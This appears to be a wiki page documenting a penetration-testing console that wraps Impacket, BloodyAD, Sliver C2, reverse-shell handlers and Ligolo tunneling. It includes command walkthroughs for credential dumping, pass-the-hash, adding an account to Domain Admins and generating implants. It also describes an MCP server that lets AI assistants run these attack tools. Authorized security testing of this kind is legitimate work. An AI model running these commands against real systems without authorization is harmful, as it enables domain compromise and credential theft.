---
layout: default
title: Integrations - UwU Toolkit
permalink: /uwu-toolkit/integrations/
---

# Integrations

UwU Toolkit integrates with external tools and services to enhance your penetration testing workflow.

---

## Table of Contents

- [Exegol Integration](#exegol-integration)
- [Impacket](#impacket)
- [BloodyAD](#bloodyad)
- [Claude AI Integration](#claude-ai-integration)
- [Sliver C2 Integration](#sliver-c2-integration)
- [Penelope Shell Handler](#penelope-shell-handler)
- [Ligolo-ng Tunneling](#ligolo-ng-tunneling)
- [MCP Server](#mcp-server)

For custom-built attack modules (Kerberoast, ADCS, coercion, etc.), see [Custom Tooling](/uwu-toolkit/custom-tooling/).

---

## Exegol Integration

[Exegol](https://github.com/ThePorgs/Exegol) is the recommended environment for UwU Toolkit. Modules automatically detect and use tools inside your Exegol container.

### Setup

```bash
# Set your Exegol container
uwu > setg EXEGOL_CONTAINER exegol-htb
```

If `EXEGOL_CONTAINER` is not set, UwU auto-detects running containers starting with `exegol-`.

---

## Impacket

Every [Impacket](https://github.com/fortra/impacket) tool is wrapped as an individual UwU module at `impacket/<tool>`. Set your globals once, then switch between 40+ modules without re-entering credentials.

### Setup

```bash
# Set globals once for all Impacket modules
uwu > setg RHOSTS 10.10.10.100
uwu > setg DOMAIN corp.local
uwu > setg USER admin
uwu > setg PASS Password123
uwu > setg DC_IP 10.10.10.100
```

### Available Modules

**Remote Execution:**

| Module | Description |
|--------|-------------|
| `impacket/psexec` | Remote execution via service creation |
| `impacket/smbexec` | Execution via SMB services (no binary upload) |
| `impacket/wmiexec` | Semi-interactive shell via WMI (stealthier) |
| `impacket/dcomexec` | Execution via DCOM objects |
| `impacket/atexec` | Execution via Task Scheduler |

**Credential Dumping:**

| Module | Description |
|--------|-------------|
| `impacket/secretsdump` | Dump SAM/LSA/NTDS secrets remotely |
| `impacket/mimikatz` | Remote mimikatz execution via RPC |

**Kerberos:**

| Module | Description |
|--------|-------------|
| `impacket/GetUserSPNs` | Kerberoasting — request SPN tickets |
| `impacket/GetNPUsers` | AS-REP Roast — no-preauth hash extraction |
| `impacket/getTGT` | Request a TGT ticket |
| `impacket/getST` | Request a service ticket (S4U2Self/S4U2Proxy) |
| `impacket/ticketer` | Create golden/silver tickets |
| `impacket/ticketConverter` | Convert between ccache and kirbi formats |
| `impacket/describeTicket` | Parse ticket contents |

**AD Enumeration:**

| Module | Description |
|--------|-------------|
| `impacket/GetADUsers` | Enumerate AD users via LDAP |
| `impacket/findDelegation` | Find delegation relationships |
| `impacket/Get-GPPPassword` | Extract Group Policy Preferences passwords |
| `impacket/lookupsid` | SID brute-force user enumeration |
| `impacket/samrdump` | Enumerate SAM users via MSRPC |
| `impacket/rpcdump` | Dump RPC endpoints |

**AD Abuse:**

| Module | Description |
|--------|-------------|
| `impacket/addcomputer` | Add a computer account to the domain |
| `impacket/rbcd` | Resource-Based Constrained Delegation abuse |
| `impacket/dacledit` | Edit DACLs on AD objects |
| `impacket/owneredit` | Edit object ownership |

**SMB:**

| Module | Description |
|--------|-------------|
| `impacket/smbclient` | SMB client — list shares, upload/download |
| `impacket/smbserver` | Host files via SMB server |
| `impacket/smbpasswd` | Change SMB password remotely |

**Relay / MiTM:**

| Module | Description |
|--------|-------------|
| `impacket/ntlmrelayx` | NTLM relay attack tool |
| `impacket/smbrelayx` | SMB relay attack |

**Other:**

| Module | Description |
|--------|-------------|
| `impacket/mssqlclient` | Interactive MSSQL client |
| `impacket/services` | Manage Windows services remotely |
| `impacket/reg` | Remote Windows registry operations |
| `impacket/changepasswd` | Change user password |
| `impacket/rdp_check` | Check valid RDP credentials |
| `impacket/raiseChild` | Escalate from child to parent domain |

### Remote Execution Example

```bash
uwu > use impacket/psexec
uwu impacket_psexec > options

  Name        Current       Required  Description
  ----        -------       --------  -----------
  RHOSTS      10.10.10.100  yes       Target host/IP
  USER        admin         yes       Username for authentication
  PASS        Password123   no        Password
  DOMAIN      corp.local    no        Domain name
  HASHES                    no        NTLM hashes (LM:NT format)
  KERBEROS    no            no        Use Kerberos authentication
  DC_IP       10.10.10.100  no        Domain controller IP
  COMMAND                   no        Command to execute

uwu impacket_psexec > run
```

Interactive tools (psexec, wmiexec, smbexec, dcomexec, mssqlclient) open in a tmux session — `Ctrl+b d` to background, `sessions` to list, `interact <name>` to reattach.

### Credential Dumping Example

```bash
uwu > use impacket/secretsdump
uwu impacket_secretsdump > set JUST_DC yes
uwu impacket_secretsdump > run

[*] Auth mode: Password (Domain)
[*] Dumping NTDS.DIT via DRSUAPI...
    Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    krbtgt:502:aad3b435b51404ee:...:::
```

### Pass-the-Hash

```bash
uwu > use impacket/wmiexec
uwu impacket_wmiexec > set HASHES aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
uwu impacket_wmiexec > set COMMAND "whoami"
uwu impacket_wmiexec > run
```

### Kerberos Clock Skew Fix

```bash
# Use faketime to fix KRB_AP_ERR_SKEW errors
uwu impacket_getTGT > set FAKETIME "2026-02-15 00:09:00"
uwu impacket_getTGT > run
```

---

## BloodyAD

Every [BloodyAD](https://github.com/CravateRouge/bloodyAD) operation is wrapped as an individual UwU module at `bloodyad/<operation>`. Each module handles one specific AD abuse action.

### Setup

```bash
# Globals apply to all bloodyad modules
uwu > setg RHOSTS 10.10.10.100
uwu > setg DOMAIN corp.local
uwu > setg USER admin
uwu > setg PASS Password123
```

### Available Modules

**ACL Abuse:**

| Module | Description |
|--------|-------------|
| `bloodyad/genericall` | Grant GenericAll on target to trustee |
| `bloodyad/writedacl` | WriteDACL abuse — grant GenericAll |
| `bloodyad/remove_genericall` | Remove GenericAll from trustee |
| `bloodyad/setowner` | Change object ownership (WriteOwner) |
| `bloodyad/dcsync` | Add DCSync replication rights |
| `bloodyad/remove_dcsync` | Remove DCSync rights |

**Group Operations:**

| Module | Description |
|--------|-------------|
| `bloodyad/addmember` | Add member to group |
| `bloodyad/removemember` | Remove member from group |

**Credential Abuse:**

| Module | Description |
|--------|-------------|
| `bloodyad/setpassword` | Reset user password (ForceChangePassword) |
| `bloodyad/shadowcreds` | Add shadow credentials to target |
| `bloodyad/remove_shadowcreds` | Remove shadow credentials |

**Delegation:**

| Module | Description |
|--------|-------------|
| `bloodyad/rbcd` | Add RBCD delegation on target |
| `bloodyad/remove_rbcd` | Remove RBCD delegation |

**Object Management:**

| Module | Description |
|--------|-------------|
| `bloodyad/addcomputer` | Add a computer account |
| `bloodyad/adduser` | Add a user account |
| `bloodyad/setobject` | Set/modify attribute on AD object |
| `bloodyad/adduac` | Add UAC flag (e.g., DONT_REQ_PREAUTH) |
| `bloodyad/removeuac` | Remove UAC flag |

**Enumeration:**

| Module | Description |
|--------|-------------|
| `bloodyad/getwritable` | Find objects writable by current user |
| `bloodyad/getobject` | Retrieve LDAP attributes for an object |
| `bloodyad/getmembership` | Retrieve group memberships |
| `bloodyad/getsearch` | Search LDAP with custom filter |
| `bloodyad/dnsdump` | Dump all DNS records |

### GenericAll Example

```bash
uwu > use bloodyad/genericall
uwu bloody_genericall > options

  Name      Current       Required  Description
  ----      -------       --------  -----------
  RHOSTS    10.10.10.100  yes       Domain Controller IP
  DOMAIN    corp.local    yes       Domain name
  USER      admin         yes       Username
  PASS      Password123   no        Password or LM:NT hash
  HASHES                  no        NTLM hashes (LM:NT format)
  TARGET                  yes       Target object (sAMAccountName)
  TRUSTEE                 yes       Principal to grant GenericAll to

uwu bloody_genericall > set TARGET DC01$
uwu bloody_genericall > set TRUSTEE svc_sql
uwu bloody_genericall > run

[+] GenericAll granted on DC01$ to svc_sql
[*] To undo: use bloodyad/remove_genericall
```

### Password Reset Example

```bash
uwu > use bloodyad/setpassword
uwu bloody_setpassword > set TARGET victim
uwu bloody_setpassword > set NEW_PASS NewPassword123!
uwu bloody_setpassword > run
```

### Add to Domain Admins Example

```bash
uwu > use bloodyad/addmember
uwu bloody_addmember > set GROUP "Domain Admins"
uwu bloody_addmember > set MEMBER attacker
uwu bloody_addmember > run
```

---

## Claude AI Integration

UwU Toolkit includes an AI-powered assistant using Claude for security research, code analysis, and interactive help.

### Setup

```bash
uwu > setg ANTHROPIC_API_KEY sk-ant-api03-your-key-here
```

### Verify Setup

```bash
uwu > claude status
[+] Claude AI is available
[*] Model: claude-sonnet-4-20250514
```

### Interactive Mode

Enter a full conversation with Claude:

```bash
uwu > claude
uwu > claude mode

[Claude AI Mode]
Type 'exit' or Ctrl+D to return
Type 'help' for commands

claude > How do I enumerate Active Directory?
```

**Session Commands:**
- `exit`, `back` - Return to UwU console
- `Ctrl+D` - Background session (keep conversation)
- `new` - Start new conversation
- `clear` - Clear conversation history
- `help` - Show commands

### Resume Session

```bash
# Background with Ctrl+D, then resume later
uwu > claude resume
uwu > claude fg   # Alias
```

### Session Management

```bash
uwu > claude sessions

  Claude Sessions
  ==================================================

  * abc123  Main Session
      5 prompts, created 14:30:22
    def456  Code Review
      3 prompts, created 10:15:00
```

### Quick Commands

One-shot queries without entering interactive mode:

```bash
# Ask a question
uwu > claude ask "How do I crack Kerberos TGS hashes?"

# With file context
uwu > claude ask "Explain this code" --context ./script.py
```

### Code Analysis

Analyze code for security vulnerabilities:

```bash
# Analyze a directory
uwu > claude analyze ./webapp/

# Analyze specific file with focus
uwu > claude analyze ./api.py --focus "injection"

# Output:
[*] Analyzing ./webapp/...

  Security Analysis
  ==================================================

  HIGH: SQL Injection in login.py:45
    query = f"SELECT * FROM users WHERE name='{username}'"
    Recommendation: Use parameterized queries

  MEDIUM: Missing input validation in api.py:23
    User input passed directly to system command
```

### Code Debugging

Debug code for errors:

```bash
# Debug a file
uwu > claude debug ./module.py

# With specific error message
uwu > claude debug ./script.py --error "ImportError: No module named requests"
```

### Change Model

```bash
# View current model
uwu > claude model
[*] Current model: claude-sonnet-4-20250514

# Change model
uwu > claude model claude-opus-4-20250514
```

### Security Context

Claude understands penetration testing context and can help with:

- Explaining attack techniques
- Analyzing tool output
- Suggesting next steps in an engagement
- Code review for exploits
- Methodology guidance (HackTricks, MITRE ATT&CK)

**Example:**
```
claude > I found a Kerberoastable user with GetUserSPNs. The hash format
         is $krb5tgs$23$*... What's my next step?

Claude: Great find! Here's your attack path:

1. Save the hash to a file (e.g., kerberoast.txt)
2. Crack with hashcat:
   hashcat -m 13100 kerberoast.txt rockyou.txt

3. If weak password, you now have creds for that service account
4. Check if the account has elevated privileges...
```

---

## Sliver C2 Integration

[Sliver](https://github.com/BishopFox/sliver) C2 is fully managed from within UwU Toolkit — server, client, implants, and sessions.

### Server Management

```bash
# Start Sliver server (background)
uwu > sliver start
[*] Starting Sliver server...
[+] Sliver server started

# Stop server
uwu > sliver stop
[*] Stopping Sliver server...
[+] Sliver server stopped
```

### Connect Client

```bash
# Connect with default config
uwu > sliver connect

# Connect with specific config
uwu > sliver connect p3ta
```

### List Configs

```bash
uwu > sliver configs

  Sliver Client Configs
  ========================================

    p3ta
      /home/p3ta/.sliver-client/configs/p3ta.cfg
    operator2
      /home/p3ta/.sliver-client/configs/operator2.cfg
```

### Status Check

```bash
uwu > sliver status

  Sliver Status
  ========================================

  Server:  Running
  Client:  Backgrounded (use 'sliver resume')
  Configs: 2 available
```

### Typical Workflow

```bash
# 1. Start server and connect
uwu > sliver start
uwu > sliver connect

# 2. Generate implant and start listener
sliver > generate --mtls 10.10.14.50:443 --os windows --arch amd64 --save implant.exe
sliver > mtls -l 443

# 3. Interact with sessions
sliver > sessions
sliver > use 1

# 4. Background to UwU (keep session alive)
# Press Ctrl+D

uwu > # Continue with other tasks

# 5. Resume when needed
uwu > sliver resume
uwu > sliver fg   # Alias
```

### Inside Sliver Mode

Once connected, full Sliver client functionality is available:

- All Sliver commands work (`sessions`, `implants`, `generate`, `use`, etc.)
- `Ctrl+D` — Background session and return to UwU
- `exit` — Exit and return to UwU

---

## Penelope Shell Handler

[Penelope](https://github.com/brightio/penelope) is an advanced shell handler with auto-upgrade capabilities, fully integrated into UwU Toolkit.

### Start Listener

```bash
# Default port (4444)
uwu > penelope

# Specific port
uwu > penelope 9001

# Specific interface
uwu > penelope -i 10.10.14.50 4444
```

### Interactive Mode

When Penelope starts, you're in full interactive mode:

```
  ╔══════════════════════════════════════════════════════╗
  ║  Penelope Shell Handler                              ║
  ║  Listening on 0.0.0.0:4444                           ║
  ║  Ctrl+D - Background and return to UwU               ║
  ║  quit   - Exit Penelope and return to UwU            ║
  ╚══════════════════════════════════════════════════════╝

[+] Listening on 0.0.0.0:4444
```

### Background & Resume

```bash
# While in Penelope, press Ctrl+D to background
# Listener remains active!

[*] Penelope session backgrounded
    Listener still active on port 4444
    Use 'penelope resume' or 'penelope fg' to return
    Use 'shells' to see connected sessions

# Resume later
uwu > penelope resume
uwu > penelope fg   # Alias
```

### Session Integration

Penelope sessions automatically appear in the shell manager:

```bash
uwu > shells

  Active Shells
  ========================================

  ID   Type       Remote             User@Host            Status
  ---- ---------- ------------------ -------------------- --------
  1    penelope   10.10.10.100:49123 www-data@victim      ACTIVE
  2    penelope   10.10.10.50:51234  root@server          ACTIVE
```

### Status Check

```bash
uwu > penelope status

  Penelope Status
  ========================================

  Status:   Backgrounded (use 'penelope resume')
  Port:     4444
  Sessions: 2
  Binary:   /opt/penelope/penelope.py
```

### Penelope Features

Inside Penelope, you get:

- **Auto PTY Upgrade** - Shells automatically upgraded
- **Multi-Session** - Handle multiple shells simultaneously
- **File Transfer** - Upload/download files easily
- **Spawn** - Spawn additional listeners

```
penelope> show           # List sessions
penelope> interact 1     # Interact with session
penelope> upgrade        # Upgrade to PTY
penelope> download /etc/passwd
penelope> upload ./linpeas.sh /tmp/
penelope> spawn 9002     # New listener on 9002
```

---

## Ligolo-ng Tunneling

[Ligolo-ng](https://github.com/nicocha30/ligolo-ng) tunneling is fully managed from UwU Toolkit — proxy, TUN interface, routes, and agents.

### Start Proxy

```bash
# Default port (11601) with auto TUN creation
uwu > ligolo

# Specific port
uwu > ligolo 11601

# Custom TUN interface
uwu > ligolo -tun mytun 11601
```

### TUN Interface Setup

UwU Toolkit automatically creates the TUN interface:

```
[*] Checking TUN interface 'ligolo'...
[!] TUN interface 'ligolo' not found, creating...
[+] TUN interface 'ligolo' created

  ╔══════════════════════════════════════════════════════╗
  ║  Ligolo-ng Proxy                                     ║
  ║  Listening on 0.0.0.0:11601                          ║
  ║  TUN Interface: ligolo                               ║
  ║  Ctrl+D - Background and return to UwU               ║
  ║  exit   - Exit Ligolo and return to UwU              ║
  ╚══════════════════════════════════════════════════════╝
```

If automatic creation fails, create manually:

```bash
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
```

### Background & Resume

```bash
# While in Ligolo, press Ctrl+D to background
# Proxy and tunnels remain active!

[*] Ligolo-ng session backgrounded
    Proxy still active on port 11601
    TUN interface 'ligolo' remains active
    Use 'ligolo resume' or 'ligolo fg' to return

# Resume later
uwu > ligolo resume
uwu > ligolo fg   # Alias
```

### Route Management

Add routes to access internal networks through the tunnel:

```bash
# Add route
uwu > ligolo route add 10.10.10.0/24
[+] Route added: 10.10.10.0/24 via ligolo

# Add another subnet
uwu > ligolo route add 172.16.0.0/16

# List routes
uwu > ligolo routes

  Ligolo Routes
  ========================================

    10.10.10.0/24 via ligolo
    172.16.0.0/16 via ligolo

# Remove route
uwu > ligolo route del 172.16.0.0/16
```

### Agent Management

View connected agents:

```bash
uwu > ligolo agents

  Ligolo-ng Agents
  ============================================================

  ID   Remote IP        Hostname             User         Tunnel
  ---- ---------------- -------------------- ------------ --------
  0    10.10.10.100     DC01                 CORP\admin   active
  1    10.10.10.50      WEB01                www-data     idle
```

### Status Check

```bash
uwu > ligolo status

  Ligolo-ng Status
  ========================================

  Status:    Backgrounded (use 'ligolo resume')
  Port:      11601
  TUN:       ligolo
  Agents:    2
  Binary:    /usr/local/bin/ligolo-proxy
  Routes:    10.10.10.0/24, 172.16.0.0/16
```

### Typical Workflow

```bash
# 1. Start proxy
uwu > ligolo

# 2. On target, run agent
./agent -connect YOUR_IP:11601 -ignore-cert

# 3. In Ligolo, select session
ligolo» session
? Specify a session:
> 0 - CORP\admin@DC01 - 10.10.10.100

# 4. Start tunnel
ligolo» start

# 5. Background to UwU
# Press Ctrl+D

# 6. Add routes
uwu > ligolo route add 10.10.10.0/24

# 7. Now you can access internal network directly!
uwu > !nmap -sV 10.10.10.50

# 8. Resume Ligolo when needed
uwu > ligolo resume
```

### Inside Ligolo Proxy

```
ligolo» session         # List/select sessions
ligolo» ifconfig        # Show agent interfaces
ligolo» start           # Start tunnel
ligolo» stop            # Stop tunnel
ligolo» listener_add    # Add reverse port forward
ligolo» listener_list   # List port forwards
```

---

## Shell Management

UwU Toolkit includes Sliver-like shell session management for basic reverse shells.

### Start Listener

```bash
# Netcat listener
uwu > listen 4444
uwu > listen 4444 nc

# Penelope listener (if available)
uwu > listen 4444 penelope
```

### List Sessions

```bash
uwu > shells
uwu > sessions   # Alias

  Active Shells
  ========================================

  ID   Type   Remote             Status     Upgraded
  ---- ------ ------------------ ---------- --------
  1    nc     10.10.10.100:49123 active     no
  2    nc     10.10.10.50:51234  active     yes
```

### Interact with Shell

```bash
uwu > interact 1
[*] Interacting with shell 1
[*] Press Ctrl+D to background

$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ ^D
[*] Shell backgrounded
```

### Kill Session

```bash
uwu > kill 1
[+] Shell 1 killed
```

---

## MCP Server

UwU Toolkit includes a [Model Context Protocol](https://modelcontextprotocol.io/) (MCP) server that exposes its pentesting tools and data to AI assistants like Claude Code.

### Architecture

The MCP server uses [FastMCP](https://github.com/jlowin/fastmcp) and exposes three resource types:

| Type | Description |
|------|-------------|
| **Tools** | 50+ security tools (Impacket, NetExec, Certipy, BloodyAD, nmap, LDAP) plus module/session/engagement management |
| **Resources** | Module catalog, available tools list, lab configurations |
| **Prompts** | Guided workflows for AD enumeration, attack path planning, lateral movement |

### Tool Categories

| Module | Tools |
|--------|-------|
| `impacket_tools` | secretsdump, psexec, wmiexec, smbexec, dcomexec, getTGT, getST, GetUserSPNs, GetNPUsers, addcomputer, rbcd, dacledit, findDelegation, mssqlclient, smbclient, lookupsid, GetLAPSPassword, GetGPPPassword |
| `netexec_tools` | Multi-protocol credential validation and enumeration (SMB, LDAP, WinRM, RDP, MSSQL, SSH, WMI) |
| `certipy_tools` | ADCS enumeration (find), certificate requests (req), authentication (auth), shadow credentials |
| `enum_tools` | nmap scanning, LDAP search, BloodyAD ACL analysis, shell command execution |
| `module_tools` | List, search, info, and run UwU modules |
| `session_tools` | Shell session management |
| `engagement_tools` | Target and credential tracking via the engagement database |
| `job_tools` | Background job management |
| `opsec_tools` | OpSec rating and assessment |

### Starting the Server

**From inside UwU console (background thread):**

The MCP server starts automatically when the console launches, listening on `0.0.0.0:9400/uwu`.

**Standalone mode:**

```bash
python3 -m uwu_mcp.run_server --host 0.0.0.0 --port 9400 --debug
```

**Via start script (Exegol container):**

```bash
./uwu_mcp/start.sh [PORT]
```

### Connecting Claude Code

Add the server to your Claude Code MCP configuration:

```json
{
  "mcpServers": {
    "uwu-toolkit": {
      "type": "url",
      "url": "http://<CONTAINER_IP>:9400/uwu"
    }
  }
}
```

### Resources

| URI | Description |
|-----|-------------|
| `uwu://modules` | Full module catalog with paths, descriptions, tags, and platform |
| `uwu://tools` | Available security tool binaries with their paths |
| `uwu://lab/iron_throne` | Iron Throne AD lab configuration (users, credentials, attack paths, ADCS templates) |

### Prompts

| Prompt | Description |
|--------|-------------|
| `ad_enumeration` | Guided AD enumeration workflow (users, groups, ACLs, ADCS, delegation, shares) |
| `attack_path_planning` | Plan attack paths from compromised user to target privilege |
| `iron_throne_walkthrough` | Guided walkthrough for the Iron Throne lab (beginner/intermediate/advanced) |
| `lateral_movement` | Lateral movement planning with credential type awareness |

---

[Back to Wiki Index](/uwu-toolkit/)
